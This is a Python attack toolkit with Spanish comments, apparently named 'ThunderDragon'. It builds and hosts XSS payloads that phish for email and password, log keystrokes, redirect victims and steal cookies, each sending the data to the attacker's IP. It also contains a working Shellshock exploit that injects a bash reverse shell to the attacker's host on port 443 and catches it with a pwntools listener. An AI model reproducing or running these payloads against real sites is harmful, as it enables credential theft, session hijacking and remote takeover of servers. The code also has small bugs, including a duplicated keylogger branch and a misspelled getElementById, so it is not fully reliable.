# Made by: Airil / Ainhoa

import os
import sys
import socket
import requests
import signal
import threading
import tempfile
import shutil
import pyperclip

from pwn import *
from termcolor import colored
from scapy.all import sniff, ICMP
from http.server import HTTPServer, SimpleHTTPRequestHandler

def stop_http_server(server):
    print(colored("[+] Stopping HTTP server...", 'green'))
    server.shutdown()
    server.server_close()
    print(colored("[+] HTTP server stopped.", 'green'))

def start_http_server(directory, port=80):
    class QuietHTTPHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

    server_address = ('', port)
    os.chdir(directory)
    httpd = HTTPServer(server_address, QuietHTTPHandler)
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    return httpd

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def indirect_xss_attacks(payload):
    lhost = get_local_ip()
    script = f'<script src="http://{lhost}/payload.js"></script>'
    pyperclip.copy(script)
    print(colored("[+] Script copied to the clipboard", 'green'))
    
    # Crea un directorio temporal para alojar el payload.js
    temp_dir = 'temp_http_server'
    os.makedirs(temp_dir, exist_ok=True)
    with open(os.path.join(temp_dir, 'payload.js'), 'w') as file:
        file.write(payload)

    print(colored("[+] Payload created", 'green'))
    print(colored("[+] Starting payload hosting HTTP server...", 'green'))
    print(colored("\n[-] CTRL+C to stop\n", 'yellow'))

    httpd = start_http_server(temp_dir, 80)

    def signal_handler(signal, frame):
        print(colored("\n[+] Exiting and cleaning up...", 'green'))
        stop_http_server(httpd)
        os.remove(os.path.join(temp_dir, 'payload.js'))
        os.rmdir(temp_dir)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    try:
        while True:
            pass
    except KeyboardInterrupt:
        pass

    signal_handler(None, None)

def xss_scripts():
    ip_question = input(str(colored("\nThunderDragon", 'blue') + colored(" Local IP or Public IP [local/public] > ", 'red'))).strip().lower()
    if ip_question == "local":
        my_ip = get_local_ip()
    else:
        my_ip = requests.get('https://api.ipify.org').text
    
    print("my ip:", my_ip)
    
    attack_type = input(str(colored("\nThunderDragon", 'blue') + colored(" ATTACK TYPE [direct/indirect] > ", 'red'))).strip().lower()
    
    used, used1 = True, False
    
    while used != True or used1 != True:
        used1 = True
        script = input(str(colored("\nThunderDragon", 'blue') + colored(" SCRIPT (help for scripts list) > ", 'red'))).strip().lower()
        
        if script == "ask for creds":
            payload = '''    var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
    if (email == null || email == ""){
        alert("Es necesario introducir un correo válido para visualizar el post");
    } else {
        fetch("http://{my_ip}/?email=" + email)
    }'''
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<script>\n' + str(payload) + '\n</script>')
                pyperclip.copy(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
        
        elif script == "ask for creds v2":
            payload = '''    var email;
	var password;
	var form = '<form>' +
		'Email: <input type="email" id="email" required>' +
		' Contraseña: <input type="password" id="password" required>' +
		'<input type="button" onclick="submitForm()" value="Submit">' +
		'</form>';

	document.getElementByld("formContainer").innerHTML = form;

	function submitForm() {
		email = document.getElementByld("email").value;
		password = document.getElementByld("password").value;
		fetch("http://{mi_ip}/?email=" + email + "&password=" + password);
	}'''
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<div id="formContainer"></div>' + '\n<script>\n' + str(payload) + '\n</script>')
                pyperclip.copy(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
                
        elif script == "keyloger":
            payload = '''    var k = "";
	document.onkeypress = function(e){
		e = e || window.event;
		k += e.key;
		var i = new Image();
		i.src = "http://{mi_ip}/" + k;
	};'''
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<div id="formContainer"></div>' + '\n<script>\n' + str(payload) + '\n</script>')
                pyperclip.copy(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
                
        elif script == "keyloger":
            web = input(str(colored("\nThunderDragon", 'blue') + colored(" DOMAIN > ", 'red'))).strip()
            payload = f'window.location.href = "https://{web}";'
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<div id="formContainer"></div>' + '\n<script>\n' + str(payload) + '\n</script>')
                pyperclip.copy(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
                
        elif script == "cookie hijacking":
            payload = '''var request = new XMLHttpRequest();
request.open('GET', 'http://{mi_ip}/?cookie=' + document.cookie);
request.send();'''
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<div id="formContainer"></div>' + '\n<script>\n' + str(payload) + '\n</script>')
                pyperclip.copy(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
            
        elif script == "help":
            print(str(colored(" SCRIPTS :", 'green', attrs=['dark', 'underline'])+
                      "\n · ask for creds"+
                      "\n · ask for creds v2"+
                      "\n · keyloger"+
                      "\n · redirect"+
                      "\n · cookie hijacking"))
            used1 = False
            
        else:
            used1 = False
    
    if attack_type == "direct":
        listening_question = input(str(colored("\nThunderDragon", 'blue') + colored(" START LISTENING [y/n] > ", 'red'))).strip().lower()
        
        if listening_question == "y" or listening_question == "yes":
            # mete el payload en un directorio temporal
            temp_dir = tempfile.mkdtemp()
            with open(os.path.join(temp_dir, 'payload.js'), 'w') as payload_file:
                payload_file.write(payload)
            
            # crea el servidor http
            httpd = start_http_server(temp_dir, 80)
            print(colored("[+] HTTP server started. Press CTRL+C to stop.", 'green'))
            
            try:
                while True:
                    continue
            except KeyboardInterrupt:
                print(colored("[+] Stopping HTTP server...", 'yellow'))
                httpd.shutdown()
                httpd.server_close()
                shutil.rmtree(temp_dir)  # Borra el directorio temporal
                print(colored("[+] HTTP server stopped.", 'green'))

def exploit_shellshock(url, proxy, lhost): # el shock de la concha de la lola XD
    def shellshock_attack(command2run):
        headers = {'User-Agent': f"() {{ :; }}; {command2run}"}
        if proxy:
            r = requests.get(url, headers=headers, proxies=proxy)
        else:
            r = requests.get(url, headers=headers)

    lport = 443

    def detect_ping(packet):
        if ICMP in packet:
            print(colored("[+] Ping intercepted! This web is VULNERABLE", 'green'))
            
    def def_handler(sig, frame):
        print(colored("\n\n[!] Exiting...\n", 'red'))
        sys.exit(1)

    signal.signal(signal.SIGINT, def_handler)

    command2run = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/443 0>&1'"
    shell = listen(lport, timeout=20)

    try:
        threading.Thread(target=shellshock_attack, args=(command2run,)).start()
    except Exception as e:
        log.error(str(e))

    shell.wait_for_connection()
    if shell.sock is None:
        log.failure("Failed to connect")
        sys.exit(1)
    else:
        shell.interactive()

def eternalblue():
    pass
